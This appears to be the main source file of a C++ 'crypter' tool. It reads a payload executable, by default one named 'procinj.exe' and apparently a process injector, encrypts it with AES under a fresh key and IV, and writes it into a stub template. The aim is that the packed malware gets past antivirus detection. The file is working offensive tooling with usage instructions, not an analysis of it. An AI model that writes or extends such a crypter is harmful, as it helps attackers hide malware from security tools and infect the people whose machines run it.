#include <iostream>
#include <cstring>
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <fstream>
#include "utils.h"
#include <iomanip>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

void printBytesHex(const vector<unsigned char>& bytes, size_t numBytes) {
    for (size_t i = 0; i < numBytes && i < bytes.size(); ++i) {
        cout << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]) << " ";
    }
    cout << dec << endl; // Switch back to decimal
}
int main(int argc, char * argv[]){
    fs::path executable_path = fs::absolute(argv[0]);
    fs::path base_path = executable_path.parent_path().parent_path()/"cppcrypter";  // Assuming the executable is two levels deep from the base path

    string path_to_payload = (base_path / "bin" / "procinj.exe").string();
    string path_to_output_dir = (base_path / "stub").string() + "\\";
    string path_to_stub_template = (base_path / "stub.cpp").string();
    
    /* 
    string path_to_payload = "C:\\Users\\18163\\Desktop\\cppcrypter\\bin\\procinj.exe";
    string path_to_output_dir = "C:\\Users\\18163\\Desktop\\cppcrypter\\stub\\";
    string path_to_stub_template = "C:\\Users\\18163\\Desktop\\cppcrypter\\stub.cpp";
    */
    if (argc == 1){
        cout << "\n\nNo arguments provided, to use default use \n\t$./main.exe -d \n" << "\nUsage: \n\t$./main.exe [\"path\\to\\payload\"] [\"path\\to\\output\\directory\"] [\"path\\to\\stub\\template\"]\n";
        return 0;
    } else if (argc == 2){
        if(strcmp(argv[1], "-d") == 0){
            cout << "\n\nUsing defaults\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template;
        } else {
            path_to_payload = argv[1];
            cout << "\n\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template;
        }
    } else if (argc == 3){
        path_to_payload = argv[1];
        path_to_output_dir = argv[2];
        cout << "\n\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template;
    } else if (argc == 4){
        path_to_payload = argv[1];
        path_to_output_dir = argv[2];
        path_to_stub_template = argv[3];
        cout << "\n\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template;
    } else {
        cout << "\n\nInvalid arguments, using default\nPath to payload: " << path_to_payload << "\nPath to output directory: " << path_to_output_dir << "\nPath to stub template: " << path_to_stub_template << "\nUsage: \n\t./main.exe [\"path\\to\\payload\"] [\"path\\to\\output\\directory\"] [\"path\\to\\stub\\template\"]\n";
        return 0;
    }

    vector<unsigned char> buf = readBinary(path_to_payload);
    if(buf.empty()){
        cerr << "buf empty\n";
        return 1;
    }

    // key and IV gen
    auto [key, iv] = generateKeyAndIV(AES_BLOCK_SIZE, AES_BLOCK_SIZE);

    //cout << "Read " << buf.size() << " bytes from the file." << endl;
    vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
    vector<unsigned char> decrypted = decrypt(payloadBytes, key, iv);

    /*
    cout << "encrypted: " << payloadBytes.size() << " bytes" << endl;
    cout << "decrypted: " << decrypted.size() << " bytes" << endl;
    printBytesHex(buf, 16);
    printBytesHex(decrypted, 16);
    */

    writeStub(path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);

    return 0;
}
